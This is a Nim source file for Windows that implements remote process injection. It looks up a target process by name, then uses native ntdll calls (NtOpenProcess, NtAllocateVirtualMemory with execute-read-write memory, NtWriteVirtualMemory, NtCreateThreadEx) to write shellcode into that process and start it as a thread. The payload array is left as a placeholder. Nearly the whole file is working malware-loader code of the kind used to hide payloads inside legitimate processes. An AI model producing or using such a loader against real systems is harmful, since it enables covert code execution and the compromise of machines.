import os
import strutils
import widestrs
import winim/lean

const
 TH32CS_SNAPPROCESS = 0x00000002

type
 PROCESSENTRY32* = object
   dwSize*: DWORD
   cntUsage*: DWORD
   th32ProcessID*: DWORD
   th32DefaultHeapID*: ULONG_PTR
   th32ModuleID*: DWORD
   cntThreads*: DWORD
   th32ParentProcessID*: DWORD
   pcPriClassBase*: LONG
   dwFlags*: DWORD
   szExeFile*: array[MAX_PATH, CHAR]
 LPPROCESSENTRY32* = ptr PROCESSENTRY32

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST

proc NtAllocateVirtualMemory(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    ZeroBits: ULONG_PTR,
    RegionSize: PSIZE_T,
    AllocationType: ULONG,
    Protect: ULONG
): NTSTATUS {.stdcall, dynlib: "ntdll.dll", importc: "NtAllocateVirtualMemory".}

proc NtWriteVirtualMemory(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    Buffer: PVOID,
    NumberOfBytesToWrite: ULONG,
    NumberOfBytesWritten: PULONG
): NTSTATUS {.stdcall, dynlib: "ntdll.dll", importc: "NtWriteVirtualMemory".}

proc NtCreateThreadEx(
    ThreadHandle: PHANDLE, 
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: POBJECT_ATTRIBUTES,  
    ProcessHandle: HANDLE, 
    StartRoutine: LPVOID,
    Argument: PVOID,
    CreateFlags: ULONG, 
    ZeroBits: SIZE_T, 
    StackSize: SIZE_T, 
    MaximumStackSize: SIZE_T, 
    AttributeList: PPS_ATTRIBUTE_LIST
): NTSTATUS {.stdcall, dynlib: "ntdll.dll", importc: "NtCreateThreadEx".}

proc NtOpenProcess(
    ProcessHandle:  PHANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: POBJECT_ATTRIBUTES,
    ClientId:  PCLIENT_ID
): NTSTATUS {.stdcall, dynlib: "ntdll.dll", importc: "NtOpenProcess".}

proc NtClose(
    Handle: HANDLE
): NTSTATUS {.stdcall, dynlib: "ntdll.dll", importc: "NtClose".}

proc CreateToolhelp32Snapshot(
    dwFlags: DWORD, 
    th32ProcessID: DWORD
): HANDLE {.stdcall, dynlib: "kernel32.dll", importc: "CreateToolhelp32Snapshot".}

proc Process32First(
    hSnapshot: HANDLE,
    lppe: LPPROCESSENTRY32
): WINBOOL {.stdcall, dynlib: "kernel32.dll", importc: "Process32First".}

proc Process32Next(
    hSnapshot: HANDLE, 
    lppe: LPPROCESSENTRY32
): WINBOOL {.stdcall, dynlib: "kernel32.dll", importc: "Process32Next".}

proc getProcessPID(processName: string): DWORD =

    var
        status: NTSTATUS
        snapshotHandle: HANDLE
        processEntry: PROCESSENTRY32

    snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshotHandle == INVALID_HANDLE_VALUE:
        let error = getLastError()

    processEntry.dwSize = sizeof(PROCESSENTRY32).int32

    if Process32First(snapshotHandle, addr(processEntry)):
        while Process32Next(snapshotHandle, addr(processEntry)):
            let entryName = $toSeq(processEntry.szExeFile[0..^1]).toLower()
            if entryName == processName.toLower():
                if $processEntry.szExeFile == processName:
                    status = NtClose(snapshotHandle)
                    return processEntry.th32ProcessID

    status = NtClose(snapshotHandle)
    return 0

proc injectRemoteProcess[I, T](shellcode: var array[I, T]): void =

    let 
        processName = paramStr(1)
        pid = getProcessPID(processName)

    var 
        pHandle: HANDLE
        objectAttributes: OBJECT_ATTRIBUTES
        clientId: CLIENT_ID
        shellcodeSize: SIZE_T = cast[SIZE_T](shellcode.len)
        baseAddress: LPVOID

    clientId.UniqueProcess = pid

    var status = NtOpenProcess(
        &pHandle, 
        PROCESS_ALL_ACCESS, 
        &objectAttributes, 
        &clientId)

    status = NtAllocateVirtualMemory(
        pHandle,
        &baseAddress,
        0,
        addr(shellcodeSize),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )

    var 
        bytesWritten: ULONG

    status = NtWriteVirtualMemory(
        pHandle,
        baseAddress,
        addr(shellcode),
        shellcodeSize.int32,
        &bytesWritten
    )

    var tHandle: HANDLE

    status = NtCreateThreadEx(
        &tHandle,
        THREAD_ALL_ACCESS,
        NULL,
        pHandle,
        baseAddress,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    )

    status = NtClose(pHandle)
    status = NtClose(tHandle)


when defined(windows):
    var shellcode: array[#size here, byte] = [

        # Payload here
    ]

    when isMainModule:
        injectRemoteProcess(shellcode)
